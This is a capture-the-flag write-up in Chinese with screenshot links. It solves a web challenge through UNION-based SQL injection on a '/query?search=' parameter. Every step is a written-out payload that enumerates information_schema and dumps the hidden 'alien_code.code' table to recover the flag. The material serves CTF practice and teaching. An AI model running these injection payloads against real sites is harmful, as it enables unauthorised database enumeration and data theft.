![](<./img/Pasted image 20230212085901.png>)

```
/
```

![](<./img/Pasted image 20230212085944.png>)

点击左侧条目会发出请求

![](<./img/Pasted image 20230212090816.png>)

```
/query?search=<name>
```

通过访问`/query`路由能够获取到包含对应地区生物信息的`json`

尝试对`search`进行SQL注入

```
/query?search=amazonis_planitia union select 1, 2
```

![](<./img/Pasted image 20230212092806.png>)

```
/query?search=amazonis_planitia union select 1, database()
```

```
aliens
```

```
/query?search=amazonis_planitia union select 1, group_concat(schema_name) from information_schema.schemata
```

```
information_schema,alien_code,aliens
```

```
/query?search=amazonis_planitia union select 1, group_concat(table_name) from information_schema.tables where table_schema = 'alien_code'
```

```
code
```

```
/query?search=amazonis_planitia union select 1, group_concat(column_name) from information_schema.columns where table_name = 'code'
```

```
id,code
```

```
/query?search=amazonis_planitia union select 1, group_concat(id) from alien_code.code
```

```
0
```

```
/query?search=amazonis_planitia union select 1, group_concat(code) from alien_code.code
```

```
flag{481d123d-ab78-45f1-a82d-506efe39483a}
```

#Web #SQL注入 #联合注入 